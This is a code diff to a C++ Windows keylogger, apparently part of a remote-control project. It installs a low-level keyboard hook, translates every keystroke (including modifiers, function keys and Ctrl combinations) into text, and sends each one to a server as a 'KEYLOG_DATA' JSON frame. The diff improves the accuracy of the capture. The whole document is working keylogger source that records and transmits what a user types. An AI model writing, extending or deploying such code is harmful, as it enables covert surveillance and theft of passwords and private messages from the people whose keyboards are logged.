@@ -3,6 +3,7 @@
 #include <thread>
 #include <string>
 #include <atomic>
+#include <vector>
 #include "../Network/ServerNetwork.h"
 #include "../ThirdParty/json.hpp"
 
@@ -19,40 +20,71 @@ private:
     static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
             
-            KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
-            DWORD vkCode = kbd->vkCode;
-            string keyName = "";
+            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
+            int vkCode = pKey->vkCode;
+            string output = "";
 
-            if (vkCode == VK_RETURN) keyName = "[Enter]";
-            else if (vkCode == VK_BACK) keyName = "[BS]";
-            else if (vkCode == VK_SPACE) keyName = " ";
-            else if (vkCode == VK_TAB) keyName = "[Tab]";
-            else if (vkCode == VK_ESCAPE) keyName = "[Esc]";
-            else if (vkCode >= 0x30 && vkCode <= 0x39) { // Số 0-9
-                keyName = string(1, (char)vkCode);
+            bool isCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+            bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+            bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+            bool isNumLock = (GetKeyState(VK_NUMLOCK) & 0x0001) != 0; 
+            if (vkCode == VK_RETURN) output = "[Enter]";
+            else if (vkCode == VK_BACK) output = "[BS]";
+            else if (vkCode == VK_TAB) output = "[Tab]";
+            else if (vkCode == VK_ESCAPE) output = "[Esc]";
+            else if (vkCode == VK_DELETE) output = "[Del]";
+            else if (vkCode == VK_CAPITAL) output = "[CapsLock]";
+            else if (vkCode == VK_SPACE) output = " ";
+            else if (vkCode == VK_LEFT) output = "[Left]";
+            else if (vkCode == VK_RIGHT) output = "[Right]";
+            else if (vkCode == VK_UP) output = "[Up]";
+            else if (vkCode == VK_DOWN) output = "[Down]";
+            else if (vkCode == VK_HOME) output = "[Home]";
+            else if (vkCode == VK_END) output = "[End]";
+            else if (vkCode == VK_PRIOR) output = "[PgUp]";
+            else if (vkCode == VK_NEXT) output = "[PgDn]";
+            else if (vkCode == VK_INSERT) output = "[Ins]";
+            else if (vkCode == VK_LWIN || vkCode == VK_RWIN) output = "[Win]";
+            else if (vkCode == VK_APPS) output = "[Menu]";
+            else if (vkCode == VK_SNAPSHOT) output = "[PrintScreen]";
+            else if (vkCode == VK_SCROLL) output = "[ScrollLock]";
+            else if (vkCode == VK_PAUSE) output = "[Pause]";
+            else if (vkCode >= VK_F1 && vkCode <= VK_F24) {
+                output = "[F" + to_string(vkCode - VK_F1 + 1) + "]";
             }
-            else if (vkCode >= 0x41 && vkCode <= 0x5A) { // Chữ A-Z
-                char key = (char)MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
-                
-                bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
-                bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-
-                if (!isShift && !isCaps) key = tolower(key);
-                if (isShift && isCaps) key = tolower(key);
-
-                keyName = string(1, key);
+            else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || 
+                     vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
+                     vkCode == VK_LMENU || vkCode == VK_RMENU) {
             }
             else {
-                char key = (char)MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
-                if (key != 0) keyName = string(1, key);
+                BYTE keyboardState[256];
+                GetKeyboardState(keyboardState);
+
+                keyboardState[VK_SHIFT] = isShift ? 0x80 : 0;
+                keyboardState[VK_CAPITAL] = isCaps ? 0x01 : 0;
+                keyboardState[VK_NUMLOCK] = isNumLock ? 0x01 : 0; 
+                keyboardState[VK_CONTROL] = 0; 
+                keyboardState[VK_LCONTROL] = 0;
+                keyboardState[VK_RCONTROL] = 0;
+                char buffer[2] = {0};
+                int result = ToAscii(vkCode, pKey->scanCode, keyboardState, (LPWORD)buffer, 0);
+
+                if (result == 1) {
+                    char ch = buffer[0];
+                    if (isCtrl && isprint(ch)) { 
+                        output = "[Ctrl+" + string(1, toupper(ch)) + "]";
+                    } 
+                    else {
+                        output = string(1, ch);
+                    }
+                }
             }
 
-            if (!keyName.empty() && g_Server != NULL && isRunning) {
-                cout << keyName; 
-
+            if (!output.empty() && g_Server != NULL && isRunning) {
+                cout << output; 
                 json j;
                 j["type"] = "KEYLOG_DATA";
-                j["payload"] = { {"keyStroke", keyName} };
+                j["payload"] = { {"keyStroke", output} };
                 g_Server->SendFrame(j.dump());
             }
         }
